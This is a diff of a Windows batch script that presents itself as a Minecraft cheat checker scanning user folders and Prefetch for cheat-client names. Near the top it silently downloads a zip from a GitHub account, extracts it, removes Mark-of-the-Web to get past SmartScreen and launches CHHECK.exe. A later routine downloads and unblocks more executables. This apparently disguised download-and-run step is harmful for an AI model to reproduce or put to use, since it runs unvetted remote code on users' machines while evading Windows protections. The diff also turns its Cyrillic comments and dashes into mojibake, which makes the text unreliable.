@@ -4,11 +4,8 @@ chcp 65001 >nul
 title FUNTIME CHK
 color 0F
 
-rem === ANSI color setup — более надёжный способ для Win11 ===
-rem Включаем virtual terminal processing через PowerShell
+rem === ANSI color setup ===
 powershell -NoProfile -Command "& {[Console]::OutputEncoding=[System.Text.Encoding]::UTF8}" >nul 2>&1
-
-rem Получаем ESC через временный файл — стабильнее на Win11
 for /f %%a in ('powershell -NoProfile -Command "[char]27"') do set "ESC=%%a"
 
 set "G=%ESC%[90m"
@@ -24,31 +21,25 @@ set "BANG=!"
 set "KWP=vape ghost drip tenacity novoline fdp liquidbounce wurst meteor delta nursultan expensive"
 set "KWM=!KWP! rise killaura aristois sigma dumik mhab cortex inject sk3d"
 
-rem === Проверка прав администратора — надёжнее net session на Win11 ===
+rem === �������� ���� �������������� ===
 set "ADMIN=0"
->nul 2>&1 (
-    reg add "HKLM\Software\__AdminCheck__" /f
-    if not errorlevel 1 (
-        reg delete "HKLM\Software\__AdminCheck__" /f >nul 2>&1
-        set "ADMIN=1"
-    )
-)
+net session >nul 2>&1
+if not errorlevel 1 set "ADMIN=1"
 
 cls
 echo.
 echo   %W%FUNTIME CHK%X%   %G%minecraft cheat checker%X%
 echo   %G%-----------------------------------------%X%
 
-rem === Скачиваем и запускаем CHHECK.exe — с проверкой что файл реально существует ===
+rem === ��������� � ��������� CHHECK.exe ===
 if not exist "%TEMP%\CHHECK\CHHECK.exe" (
-    powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{Invoke-WebRequest -Uri 'https://github.com/kaghohop-gif/chk/raw/refs/heads/main/CHHECK.zip' -OutFile '%TEMP%\CHHECK.zip'}catch{}" 
+    powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{Invoke-WebRequest -Uri 'https://github.com/kaghohop-gif/chk/raw/refs/heads/main/CHHECK.zip' -OutFile '%TEMP%\CHHECK.zip'}catch{}"
     if exist "%TEMP%\CHHECK.zip" (
         powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';try{Expand-Archive -Path '%TEMP%\CHHECK.zip' -DestinationPath '%TEMP%\CHHECK' -Force}catch{}"
         del /q "%TEMP%\CHHECK.zip" >nul 2>&1
     )
 )
 if exist "%TEMP%\CHHECK\CHHECK.exe" (
-    rem Снимаем Mark-of-the-Web чтобы SmartScreen не блокировал
     powershell -NoProfile -ExecutionPolicy Bypass -Command "Unblock-File -Path '%TEMP%\CHHECK\CHHECK.exe'" >nul 2>&1
     start "" "%TEMP%\CHHECK\CHHECK.exe"
 )
@@ -73,7 +64,6 @@ if not defined cmd (
 set /a empty=0
 
 :route
-rem Убираем trailing пробел
 if "!cmd:~-1!"==" " (
     set "cmd=!cmd:~0,-1!"
     goto route
@@ -87,7 +77,7 @@ if /i "!cmd:~0,6!"=="--load" (
     goto load
 )
 if /i "!cmd!"=="--help" goto help
-echo   %G%unknown command — list: --help%X%
+echo   %G%unknown command � list: --help%X%
 goto prompt
 
 :help
@@ -218,7 +208,7 @@ for %%f in ("%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\*") do (
     )
 )
 
-echo   %G%6/7 files — downloads / desktop / recent / temp%X%
+echo   %G%6/7 files � downloads / desktop / recent / temp%X%
 for %%p in ("%USERPROFILE%\Downloads" "%USERPROFILE%\Desktop" "%APPDATA%\Microsoft\Windows\Recent" "%TEMP%") do (
     for %%k in (!KWM!) do (
         for /f "delims=" %%f in ('dir /b "%%~p" 2^>nul ^| findstr /i "%%k"') do (
@@ -230,7 +220,7 @@ for %%p in ("%USERPROFILE%\Downloads" "%USERPROFILE%\Desktop" "%APPDATA%\Microso
 
 echo   %G%7/7 prefetch%X%
 if "!ADMIN!"=="0" (
-    echo      %G%[-] no admin rights — skipped%X%
+    echo      %G%[-] no admin rights � skipped%X%
 ) else (
     for /d %%f in ("C:\Windows\Prefetch\*") do (
         for %%k in (!KWM!) do (
@@ -254,7 +244,7 @@ if "!ADMIN!"=="0" (
 
 echo   %G%-----------------------------------------%X%
 if !found! gtr 0 (
-    echo   %R%[!BANG!] result: found !found! — check in JournalTrace / WinPrefetchView%X%
+    echo   %R%[!BANG!] result: found !found! � check in JournalTrace / WinPrefetchView%X%
 ) else (
     echo   %GN%[+] result: nothing suspicious%X%
 )
@@ -294,7 +284,6 @@ if not exist "%tdir%\" (
     ) else (
         powershell -NoProfile -ExecutionPolicy Bypass -Command "$ProgressPreference='SilentlyContinue';[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12;try{Invoke-WebRequest -Uri '%turl%' -OutFile '%tdir%\%tid%.exe'}catch{Write-Host 'download failed'}"
     )
-    rem Снимаем блокировку загруженного файла
     if exist "%tdir%\*.exe" (
         powershell -NoProfile -ExecutionPolicy Bypass -Command "Get-ChildItem '%tdir%\*.exe' | Unblock-File" >nul 2>&1
     )
